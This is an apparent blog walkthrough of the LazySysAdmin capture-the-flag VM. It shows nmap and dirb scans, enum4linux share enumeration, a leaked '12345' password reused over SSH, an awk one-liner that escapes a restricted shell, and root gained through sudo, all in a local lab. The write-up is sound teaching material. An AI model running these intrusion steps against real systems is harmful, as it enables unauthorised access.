---
    title: LazySysAdmin Walkthrough
    date: 2019-01-03
    excerpt: "LazySysAdmin CTF Write-up and Tutorial"
    tags: [ctf, cybersec, nmap]
---

LazySysAdmin is a beginner-friendly CTF that showcases several classic mistakes some system administrators can make. The title is fitting to say the least.

VM can be downloaded at [Vulnhub](https://www.vulnhub.com/entry/lazysysadmin-1,205/).

## My Setup
I'll be attacking this in Kali Linux from VirtualBox on Windows. As with all the other CTFs I've done, they're on a shared NATNetwork with Kali.

**IP Range:** The IP range I have set for the NATNetwork is 10.0.2.0/24.

## VM Discovery
As usual, a quick Nmap ping scan reveals the target.

```bash
root@kali:~# nmap -sP 10.0.2.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-02 16:40 EST
...
MAC Address: 08:00:27:7F:98:2D (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.5
Host is up (0.00023s latency).
...
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.06 seconds
```

.5 is the LazySysAdmin VM.

## Port Scanning
Poking a system from afar is the basis for CTFs. Oh Oracle Nmap, reveal to us the target's secrets...

```bash
root@kali:~# nmap -p- -sV -T4 -sS 10.0.2.5
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-02 16:42 EST
Nmap scan report for 10.0.2.5
Host is up (0.00011s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
MAC Address: 08:00:27:FE:F5:12 (Oracle VirtualBox virtual NIC)
Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.38 seconds
```

Anytime there's a webserver (Apache, Nginx, etc.) present, it's best to scan it ASAP. I like running both Dirbuster and Nikto.

## Web busting
Dirb quickly reveals a few interesting directories. I canceled the scan early (since phpmyadmin has lots of subdirectories).

```bash
root@kali:~# dirb http://10.0.2.5
...
---- Scanning URL: http://10.0.2.5/ ----
==> DIRECTORY: http://10.0.2.5/apache/
+ http://10.0.2.5/index.html (CODE:200|SIZE:38)
+ http://10.0.2.5/info.php (CODE:200|SIZE:77193)
==> DIRECTORY: http://10.0.2.5/javascript/
==> DIRECTORY: http://10.0.2.5/old/
==> DIRECTORY: http://10.0.2.5/phpmyadmin/
+ http://10.0.2.5/robots.txt (CODE:200|SIZE:92)
+ http://10.0.2.5/server-status (CODE:403|SIZE:288)
==> DIRECTORY: http://10.0.2.5/test/
==> DIRECTORY: http://10.0.2.5/wordpress/
==> DIRECTORY: http://10.0.2.5/wp/
```

Going through these one by one.

| Directory | Findings |
| --------- | -------- |
| /apache/ | Empty folder |
| /index.html | Looks like a generic fill-in-the-blank template homepage. |
| /info.php | phpinfo() page |
| /javascript/ | 403 Error |
| /old/ | Empty directory |
| /phpmyadmin | PHPMyAdmin |
| /robots.txt | Reveals a few more directories: /old/, /test/, /TR2/, and /Backnode_files |
| /server-status | 403 |
| /test/ | Empty |
| /wordpress/ | A wordpress site. Screenshot below. |
| /wp/ | Empty |

From info.php, we can see that PHP is version 5.5.9-1. There's a lot of information on this page, from PHP variables to extension data, but I'm not finding anything super interesting.

## Wordpress
Running wpscan is always a good idea (if going loud is fine) on a target WP installation. However, this one seems pretty barren. Upon visiting in a browser, we get a single post like so:

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/lazysys/wordpress.PNG" alt="">
  <figcaption>The one post, by togie.</figcaption>
</figure>

Might be a username.

## Enum4Linux
Another scanning script, this one checks things like linux user IDs, file shares, printer information, etc. Can't recall the last time I ran into a printer connected to a server, but hey.

```bash
root@kali:~# enum4linux 10.0.2.5
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jan  3 10:18:44 2019
...
=====================================
|    Share Enumeration on 10.0.2.5    |
=====================================

   Sharename       Type      Comment
   ---------       ----      -------
   print$          Disk      Printer Drivers
   share$          Disk      Sumshare
   IPC$            IPC       IPC Service (Web server)
Reconnecting with SMB1 for workgroup listing.

   Server               Comment
   ---------            -------

   Workgroup            Master
   ---------            -------
   WORKGROUP            LAZYSYSADMIN

[+] Attempting to map shares on 10.0.2.5
//10.0.2.5/print$	Mapping: DENIED, Listing: N/A
//10.0.2.5/share$	Mapping: OK, Listing: OK
//10.0.2.5/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
...
```

Mapping and listing OK? We need to check this out.

Opening the share in the file manager via smb://10.0.2.5/share$ reveals the following:

<figure>
  <img src="{{ site.url }}{{ site.baseurl }}/assets/img/lazysys/directory.PNG" alt="">
  <figcaption>Samba share listing.</figcaption>
</figure>

Judging by info.php, index.html, the wordpress folder, I'd say this the webroot directory. We haven't seen deets.txt before.

```bash
root@kali:~# curl http://10.0.2.5/deets.txt
CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345
```

So our web admin hates multiple passwords and has decided on 12345. The todolist is too little, too late.

```bash
root@kali:~# curl http://10.0.2.5/todolist.txt
Prevent users from being able to view to web root using the local file browser
```

Let's try the credentials from wordpress and deets.txt (togie:12345).

```bash
root@kali:~# ssh togie@10.0.2.5
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         #
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   #
##################################################################################################

togie@10.0.2.5's password:
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

 System information disabled due to load higher than 1.0

133 packages can be updated.
0 updates are security updates.

togie@LazySysAdmin:~$
```

And we're in as togie. Let's see if we can't get root.

...One problem, though. We're in a restricted shell. (An odd change of pace here)

Kudos to [SANS Institute](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells) for the restricted shell guide. The old Vi shell spawn didn't work, but we can run awk scripts.

```bash
togie@LazySysAdmin:~$ cd /
-rbash: cd: restricted
togie@LazySysAdmin:~$ /bin/sh
-rbash: /bin/sh: restricted: cannot specify `/' in command names
togie@LazySysAdmin:~$ export PATH=/bin:/usr/bin:$PATH
-rbash: PATH: readonly variable
togie@LazySysAdmin:~$ awk 'BEGIN {system("/bin/sh")}'
$ whoami
togie
```

We can check if anyone has sudo access with the getent command:

```bash
$ getent group sudo
sudo:x:27:togie
$ sudo /bin/sh
[sudo] password for togie:
# whoami
root
```

And that's that. Of course, we could wreak havoc on this system, but we've accomplished what we set out to do here.
